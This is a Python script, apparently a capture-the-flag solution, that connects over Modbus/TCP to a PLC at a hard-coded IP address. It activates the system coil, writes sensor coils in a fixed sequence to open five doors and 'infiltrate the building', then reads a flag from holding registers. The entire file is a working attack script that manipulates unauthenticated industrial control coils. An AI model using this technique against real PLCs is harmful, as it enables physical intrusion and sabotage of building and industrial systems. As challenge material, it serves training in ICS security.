#!/usr/bin/python3

import socket
from time import sleep
from umodbus import conf
from umodbus.client import tcp

# --- Configuration & Setup ---

# Adjust modbus configuration to handle signed values [cite: 221]
conf.SIGNED_VALUES = True

# Define the server connection details
# The IP and Port must be changed to the specific Docker instance for the challenge.
REMOTE_IP = "94.237.50.221"
REMOTE_PORT = 59725

# Create a dictionary of coil addresses for readability.
# These addresses are derived from the PLC's structured text file[cite: 77, 92].
C_ADDRESSES = {
    'system_active': 602, # [cite: 94]
    'Door_0': 32, # [cite: 95]
    'Door_1': 33, # [cite: 96]
    'Door_2': 34, # [cite: 97]
    'Door_3': 35, # [cite: 98]
    'Door_4': 36, # [cite: 99]
    'sensor_0': 64, # [cite: 100]
    'sensor_1': 65, # [cite: 102]
    'sensor_2': 66, # [cite: 103]
    'sensor_4': 68, # [cite: 105]
    'sensor_5': 296, # [cite: 106]
    'sensor_6': 297, # [cite: 107]
    'sensor_7': 298, # [cite: 108]
    'sensor_10': 416, # [cite: 111]
    'sensor_11': 422, # [cite: 112]
    'sensor_12': 134, # [cite: 113]
    'sensor_13': 135, # [cite: 114]
    'sensor_14': 128 # [cite: 115]
}

# Define the required sensor logic for each door as per the PLC logic analysis[cite: 123].
# Format: [sensor_coils], [logic_states (1 for TRUE, 0 for FALSE)]
door_logic = {
    'door_3': {
        'coils': [C_ADDRESSES['sensor_10'], C_ADDRESSES['sensor_11'], C_ADDRESSES['sensor_12'], C_ADDRESSES['sensor_13']],
        'states': [1, 0, 1, 1] # [cite: 136]
    },
    'door_0': {
        'coils': [C_ADDRESSES['sensor_0'], C_ADDRESSES['sensor_1'], C_ADDRESSES['sensor_2'], C_ADDRESSES['sensor_4']],
        'states': [1, 1, 0, 1] # [cite: 125]
    },
    'door_4': {
        'coils': [C_ADDRESSES['sensor_10'], C_ADDRESSES['sensor_12'], C_ADDRESSES['sensor_13'], C_ADDRESSES['sensor_14']],
        'states': [1, 1, 1, 1] # [cite: 138]
    },
    'door_1': {
        'coils': [C_ADDRESSES['sensor_0'], C_ADDRESSES['sensor_5'], C_ADDRESSES['sensor_6'], C_ADDRESSES['sensor_7']],
        'states': [1, 1, 0, 1] # [cite: 129]
    },
    'door_2': {
        'coils': [C_ADDRESSES['sensor_5'], C_ADDRESSES['sensor_10'], C_ADDRESSES['sensor_7'], C_ADDRESSES['sensor_11']],
        'states': [1, 1, 0, 1] # [cite: 132]
    }
}

# The required door order to infiltrate the building[cite: 1, 151].
door_order = ['door_3', 'door_0', 'door_4', 'door_1', 'door_2']

# --- Main Execution ---

# Create a socket connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((REMOTE_IP, REMOTE_PORT))
    print(f"Successfully connected to {REMOTE_IP}:{REMOTE_PORT}")

    # 1. Start the system by forcing the system_active coil to TRUE[cite: 153].
    print("Step 1: Activating PLC system...")
    start_command = tcp.write_multiple_coils(slave_id=1, starting_address=C_ADDRESSES['system_active'], values=[1])
    tcp.send_message(start_command, sock)
    sleep(1) # Wait a moment for the system to initialize.
    print("System activated.")

    # 2. Iterate through the doors in the specified order.
    for i, door_name in enumerate(door_order):
        print(f"\n--- Round {i}: Targeting {door_name} ---")
        current_coils = door_logic[door_name]['coils']
        current_states = door_logic[door_name]['states']

        # Open the door by setting the required sensor states.
        print(f"Opening {door_name}...")
        for j, coil in enumerate(current_coils):
            state = current_states[j]
            print(f"  Writing {state} to sensor coil {coil}")
            command = tcp.write_multiple_coils(slave_id=1, starting_address=coil, values=[state])
            tcp.send_message(command, sock)
            sleep(0.1) # Small delay between commands

        # Wait 10 seconds. This accounts for the PLC's scan interval (1s) and the longest door timer (8s)[cite: 122, 149].
        print(f"Waiting 10 seconds for {door_name} to open...")
        sleep(10)

        # Close the door by resetting the sensors to ensure only one door is open at a time[cite: 139].
        print(f"Closing {door_name} by resetting sensors...")
        reversed_states = [1 - s for s in current_states] # [cite: 174]
        for j, coil in enumerate(current_coils):
            state = reversed_states[j]
            command = tcp.write_multiple_coils(slave_id=1, starting_address=coil, values=[state])
            tcp.send_message(command, sock)
            sleep(0.1)
        sleep(1)

    # 3. Retrieve the flag from the holding registers.
    # The flag is available starting at address 4 after the mission is complete[cite: 5].
    print("\n--- All door sequences completed. ---")
    print("Step 3: Reading flag from holding registers...")
    flag_command = tcp.read_holding_registers(slave_id=1, starting_address=4, quantity=100) # [cite: 215]
    response = tcp.send_message(flag_command, sock)
    
    # 4. Decode the flag from the response.
    # The response is a list of ASCII values that need to be converted to characters.
    if response:
        # Filter out null bytes and convert ASCII values to characters
        flag = ''.join(chr(c) for c in response if c != 0)
        print("\n[SUCCESS] Flag found!")
        print(f"Raw Response: {response}") # [cite: 219]
        print(f"Decoded Flag: {flag}")
    else:
        print("[FAILURE] Did not receive a valid response for the flag.")

except socket.error as e:
    print(f"Socket Error: {e}. Could not connect to the server.")
except Exception as e:
    print(f"An error occurred: {e}")
finally:
    # Close the connection
    print("\nClosing the connection.")
    sock.close()